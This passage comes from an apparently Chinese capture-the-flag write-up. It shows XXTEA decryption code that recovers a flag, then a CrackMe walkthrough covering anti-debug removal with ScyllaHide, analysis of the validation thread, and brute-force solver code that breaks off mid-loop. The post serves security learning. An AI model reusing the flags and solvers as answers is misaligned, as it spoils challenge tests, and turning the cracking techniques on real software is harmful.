operator\">+=</span> MX<span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>z <span class=\"token operator\">==</span> <span class=\"token number\">0xA4F41487</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"11\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">==</span> <span class=\"token number\">0xA4F41487</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"11\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> MX<span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">&lt;</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">/* Decoding Part */</span>\n    <span class=\"token punctuation\">&#123;</span>\n        n <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>n<span class=\"token punctuation\">;</span>\n        rounds <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span>\n        sum <span class=\"token operator\">=</span> rounds <span class=\"token operator\">*</span> DELTA<span class=\"token punctuation\">;</span>\n        y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span>\n        <span class=\"token punctuation\">&#123;</span>\n            e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sum <span class=\"token operator\">>></span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">=</span> n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> p<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>p<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            z <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span>n <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            y <span class=\"token operator\">=</span> v<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> MX<span class=\"token punctuation\">;</span>\n            sum <span class=\"token operator\">-=</span> DELTA<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">--</span>rounds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xAABB</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> Enc<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0xa9934e2f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30b90fa</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xdcbf1d3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x328b5bde</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x44fab4e</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1dcf0051</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85ebbe55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93aa773a</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">xxtea</span><span class=\"token punctuation\">(</span>Enc<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%.32s\\n\"</span><span class=\"token punctuation\">,</span> Enc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>flag{th15_15_51mpLe_obf_R19Ht?}</p>\n<h3 id=\"CrackMe\"><a href=\"#CrackMe\" class=\"headerlink\" title=\"CrackMe\"></a>CrackMe</h3><p>有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。</p>\n<p><img src=\"/images/47-1744626745338-52.png\"></p>\n<p><img src=\"/images/48-1744626745338-53.png\"></p>\n<p>从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。</p>\n<p><img src=\"/images/49-1744626745338-54.png\"></p>\n<p><img src=\"/images/50-1744626745338-55.png\"></p>\n<p><img src=\"/images/51-1744626745338-56.png\"></p>\n<p><img src=\"/images/52-1744626745338-57.png\"></p>\n<p>从TLS那边可以看到启动了一个线程，线程函数如下</p>\n<p><img src=\"/images/53-1744626745339-58.png\"></p>\n<p>这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。</p>\n<p><img src=\"/images/54-1744626745339-59.png\"></p>\n<p>将这边v4都异或上0xBB会得到”flag{“五个字符，就明白这边是检测输入flag开头是否为”flag{“，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。</p>\n<p><img src=\"/images/55-1744626745339-60.png\"></p>\n<p>mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。</p>\n<p>这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。</p>\n<p><img src=\"/images/56-1744626745339-61.png\"></p>\n<p>爆破代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0BA6CAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A05DF1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9ABFB3B7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB40BBE36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74B1D29A</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xEE0E612D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2EB40D81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3667A2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73DC1683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE963A534</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29D9C998</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x076DC419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7D7A8B5</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x5D681B02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9DD277AE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBDBDF21D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D079EB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7B82D06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x270241AA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09B64C2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC90C2087</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x53B39330</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9309FF9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0EDB8832</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE61E49E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54DE5729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94643B85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBAD03604</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A6A5AA8</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xE0D5E91F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x206F85B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA00AE279</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60B08ED5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA0F3D62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3AB551CE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14015C4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4BB30E3</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x4E048354</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8EBEEFF8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x136C9856</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3D6F4FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4969474D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89D32BE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7672660</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67DD4ACC</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xFD62F97B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3DD895D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1DB71064</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD0D7CC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47B2CF7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8708A3D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9BCAE52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6906C2FE</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xF3B97149</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33031DE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAED16A4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E6B06E7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4D4B550</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x346ED9FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1ADAD47D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA60B8D1</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x40DF0B66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x806567CA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B64C2B1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5BDEAE1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1611DAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01DB7106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F6F7C87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEFD5102B</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x756AA39C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5D0CF30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2802B89E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8B8D432</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72076785</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2BD0B29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C0906A8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5CB36A04</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xC60CD9B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06B6B51F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26D930AC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6635C00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7CDCEFB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC66831B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92D28E9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5268E236</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xC8D75181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x086D3D2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95BF4A83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5505262F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCFBA9598</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F00F934</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21B4F4B5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE10E9819</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x7BB12BAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB0B4702</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B6E20C8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFBD44C64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x616BFFD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1D1937F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F659EFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4FDFF252</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xD56041E5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15DA2D49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88085AE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48B2364B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD20D85FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12B7E950</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C03E4D1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFCB9887D</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x66063BCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6BC5766</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86D3D2D5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4669BE79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDCD60DCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C6C6162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32D86CE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF262004F</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x68DDB3F8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA867DF54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35B5A8FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF50FC456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6FB077E1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF0A1B4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81BE16CC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41047A60</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xDBBBC9D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B01A57B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEDB88321</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D02EF8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7BD5C3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77073096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59B33D17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x990951BB</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x03B6E20C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC30C8EA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5EDEF90E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E6495A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04DB2615</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4614AB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEAD54738</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A6F2B94</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xB0D09823</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x706AF48F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5005713C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90BF1D90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A00AE27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCABAC28B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE40ECF0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24B4A3A6</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xBE0B1011</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7EB17CBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3630B13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23D967BF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB966D408</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79DCB8A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5768B525</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97D2D989</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x0D6D6A3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCDD70692</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4DB26158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D080DF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17B7BE43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD70DD2EF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9B9DF6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3903B3C2</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xA3BC0075</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63066CD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFED41B77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E6E77DB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4D1C46C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x646BA8C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4ADFA541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A65C9ED</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x10DA7A5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD06016F6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF00F9345</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30B5FFE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA0A4C5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6AB020F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44042D73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84BE41DF</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x1E01F268</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDEBB9EC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4369E96A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83D385C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x196C3671</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9D65ADD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF762575C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37D83BF0</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xAD678847</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6DDDE4EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76DC4190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6662D3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2CD99E8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC63F227</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2D7FFA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x026D930A</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x98D220BD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58684C11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5BA3BBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05005713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9FBFE4A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F058808</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71B18589</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB10BE925</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x2BB45A92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB0E363E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB61B38D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0BDBDF21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91646C96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51DE003A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F6A0DBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBFD06117</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x256FD2A0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5D5BE0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7807C9A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8BDA50E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x220216B9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2B87A15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC0C7794</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0CB61B38</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x9609A88F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56B3C423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6D6A3E9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x166CCF45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8CD37CF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C69105E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62DD1DDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2677173</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x38D8C2C4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF862AE68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65B0D9C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA50AB56A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3FB506DD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF0F6A71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1BB67F0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11010B5C</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x8BBEB8EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B04D447</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B6B51F4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xABD13D58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x316E8EEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1D4E243</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF60EFC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1FDA836E</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x856530D9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45DF5C75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD80D2BDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18B74777</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8208F4C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42B2986C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C0695ED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xACBCF941</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x36034AF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCC00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">uint32_t</span> enc1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token number\">0x46A95BAD</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x1CAC84B6</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xA67CB2B2</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x32188937</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x4872D39F</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0xF2A2E59B</span><span class=\"token punctuation\">,</span>\n      <span class=\"token number\">0x011B94D2</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// 爆破前7字节</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> c <span class=\"token operator\">=</span> <span class=\"token number\">28</span><span class=\"token punctuation\">;</span> c <span class=\"token 